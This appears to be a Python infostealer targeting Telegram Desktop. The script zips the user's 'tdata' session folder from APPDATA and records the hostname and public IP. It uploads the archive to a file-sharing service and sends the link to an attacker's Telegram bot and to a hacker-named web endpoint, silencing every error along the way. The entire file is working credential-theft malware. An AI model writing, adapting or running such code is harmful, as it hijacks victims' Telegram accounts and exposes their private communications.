import os
import zipfile
import requests
import socket
appdata = os.getenv('APPDATA')
ID= 'id telegram bot'

token = 'token telegram bot'


def toZip(file, filename):
    zip_file = zipfile.ZipFile(filename, 'w')
    if os.path.isfile(file):
        zip_file.write(file)
    else:
        addFolderToZip(zip_file, file)
    zip_file.close()


def addFolderToZip(zip_file, folder):
    for file in os.listdir(folder):
        full_path = os.path.join(folder, file)
        if os.path.isfile(full_path):
            zip_file.write(full_path)
        elif os.path.isdir(full_path):
            addFolderToZip(zip_file, full_path)

try:
    if not os.path.exists(f'{appdata}/Telegram Desktop/'): exit(0)
except:
    pass
try:
    if os.path.exists(f'{appdata}/Telegram Desktop/z.zip'): os.remove(f'{appdata}/Telegram Desktop/z.zip')
except:
    pass
try:
    filename = f'{appdata}/Telegram Desktop/z.zip'
    directory = f'{appdata}/Telegram Desktop/tdata'
    toZip(directory, filename)
except:
    pass
try:
    try:
        name = socket.gethostname()
    except:
        name = ''
    try:
        ipp=requests.get("https://api64.ipify.org?format=json").json()

        ip = ipp["ip"]
    except:

        ip = ''
    try:
        url = requests.post('https://api.anonfiles.com/upload',
                            files={'file': open(f'{appdata}/Telegram Desktop/z.zip', 'rb')}).json()['data']['file'][
            'url']['full']
        msg = f'\nName: {name}\nip: {ip}\nAs: {appdata}\nIsp: \n\ntelegram-tdata: ' + url
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
        requests.get(f"https://zain-hacker.com/telegram/write.php?url={url}&UserPc={name}")
    except:
        pass

except:
    pass
